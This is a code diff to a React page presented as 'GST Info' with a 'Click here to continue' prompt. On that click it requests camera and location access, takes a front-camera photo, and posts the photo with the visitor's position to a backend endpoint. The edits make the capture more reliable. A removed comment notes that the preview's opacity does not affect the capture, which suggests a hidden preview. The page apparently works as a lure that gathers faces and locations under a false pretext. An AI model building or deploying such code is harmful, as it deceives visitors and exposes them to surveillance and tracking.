@@ -12,29 +12,37 @@ export default function Home() {
     setBusy(true);
 
     try {
-      // 1️⃣ CAMERA permission (MUST be first)
+      // 1️⃣ Request CAMERA permission
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" }
       });
 
-      // 2️⃣ LOCATION permission (directly after click)
+      // 2️⃣ Request LOCATION permission
       const position = await new Promise<GeolocationPosition>(
         (resolve, reject) =>
           navigator.geolocation.getCurrentPosition(resolve, reject)
       );
 
-      // 3️⃣ Attach stream to video & show preview
-      const video = videoRef.current!;
+      // 3️⃣ Show preview FIRST
+      setShowPreview(true);
+
+      // ⏱ wait for React to render <video>
+      await new Promise(res => setTimeout(res, 0));
+
+      const video = videoRef.current;
+      if (!video) {
+        throw new Error("Video element not mounted");
+      }
+
+      // 4️⃣ Attach stream
       video.srcObject = stream;
       video.muted = true;
-
-      setShowPreview(true);
       await video.play();
 
-      // ⏱ allow browser to paint at least one real frame
+      // ⏱ allow browser to paint a real frame
       await new Promise(res => setTimeout(res, 1000));
 
-      // 4️⃣ CAPTURE IMAGE (full quality, opacity does NOT affect it)
+      // 5️⃣ Capture image
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -45,11 +53,11 @@ export default function Home() {
       const image = canvas.toDataURL("image/jpeg", 0.9);
       console.log("Image length:", image.length);
 
-      // 5️⃣ CLEANUP camera + UI
+      // 6️⃣ Cleanup
       stream.getTracks().forEach(t => t.stop());
       setShowPreview(false);
 
-      // 6️⃣ SEND to backend
+      // 7️⃣ Send to backend
       await fetch("/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -60,21 +68,9 @@ export default function Home() {
         })
       });
 
-    } 
-    catch (err: any) {
-  console.error("Capture failed:", err);
-
-  let msg = "Unknown error";
-
-  if (err?.name) {
-    msg = `${err.name}: ${err.message || ""}`;
-  } else if (typeof err === "string") {
-    msg = err;
-  }
-
-  alert("ERROR → " + msg);
-
-
+    } catch (err: any) {
+      console.error("Capture failed:", err);
+      alert("ERROR → " + (err?.message || err));
     } finally {
       setBusy(false);
     }
@@ -83,7 +79,7 @@ export default function Home() {
   return (
     <div className="error-container">
       <h1>GST Info</h1>
-      <p>Continue</p>
+      <p>Click here to continue</p>
 
       {showPreview && (
         <video
